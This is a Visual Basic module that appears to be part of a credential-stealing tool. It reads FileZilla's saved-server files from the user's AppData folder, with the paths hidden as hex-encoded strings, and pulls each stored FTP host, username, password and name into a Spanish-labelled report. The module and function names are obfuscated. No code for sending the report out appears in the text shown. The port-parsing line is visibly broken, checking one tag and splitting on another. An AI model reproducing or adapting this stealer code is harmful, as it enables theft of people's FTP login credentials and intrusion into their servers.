Attribute VB_Name = "hFtlogs"
Option Explicit
Function DualXmlZila() As String
On Error Resume Next
    Dim MlParche As String
    Dim DatoMl As String
    Dim sXML2Path As String
    Dim ff As Long
    Dim sXML2Data As String
    MlParche = Environ("appdata") & Desencriptar("5C46696C655A696C6C615C736974656D616E616765722E786D6C")
    sXML2Path = Environ("appdata") & Desencriptar("5C46696C655A696C6C615C726563656E74736572766572732E786D6C")
    If Dir$(MlParche, vbNormal) <> "" Then
        ff = FreeFile
        Open MlParche For Binary As #ff
            DatoMl = Space(LOF(ff))
            Get #ff, , DatoMl
        Close #ff
        If Dir$(sXML2Path, vbNormal) <> "" Then
            Open sXML2Path For Binary As #ff
                sXML2Data = Space(LOF(ff))
                Get #ff, , sXML2Data
            Close #ff
            DatoMl = DatoMl & vbCrLf & sXML2Data
        End If
        If Len(DatoMl) > 0 Then
            Dim vEach      As Variant
            Dim vELine      As Variant
            Dim sServer()  As String
            Dim sLine()     As String
            Dim iCnt         As Integer
            Dim sAcc        As String
            iCnt = 0
            sAcc = String(2, "/n") & vbCrLf
            If UBound(Split(DatoMl, "<Server>")) > 0 Then
                sServer = Split(DatoMl, "<Server>")
                For Each vEach In sServer
                    vEach = Split(vEach, "</Server>")(0)
                    If UBound(Split(vEach, vbCrLf)) > 0 Then
                        sLine = Split(vEach, vbCrLf)
                        For Each vELine In sLine
                            vELine = Trim$(vELine)
                            If InStr(vELine, "<Host>") Then
                                iCnt = iCnt + 1
                                sAcc = sAcc & "Numero: " & iCnt & vbCrLf & _
                                "Host: " & Split(Split(vELine, "<Host>")(1), "</Host>")(0) & vbCrLf
                            End If
                            If InStr(vELine, "<Puerto>") Then sAcc = sAcc & "Puerto: " & Split(Split(vELine, "<Port>")(1), "</Port>")(0) & vbCrLf
                            If InStr(vELine, "<User>") Then sAcc = sAcc & "Usuario: " & Split(Split(vELine, "<User>")(1), "</User>")(0) & vbCrLf
                            If InStr(vELine, "<Pass>") Then sAcc = sAcc & "Clave: " & Split(Split(vELine, "<Pass>")(1), "</Pass>")(0) & vbCrLf
                            If InStr(vELine, "<Name>") Then sAcc = sAcc & "Nombre: " & Split(Split(vELine, "<Name>")(1), "</Name>")(0) & vbCrLf & String(2, "/n") & vbCrLf
                        Next
                    End If
                Next
            End If
        End If
    End If
    DualXmlZila = sAcc
End Function


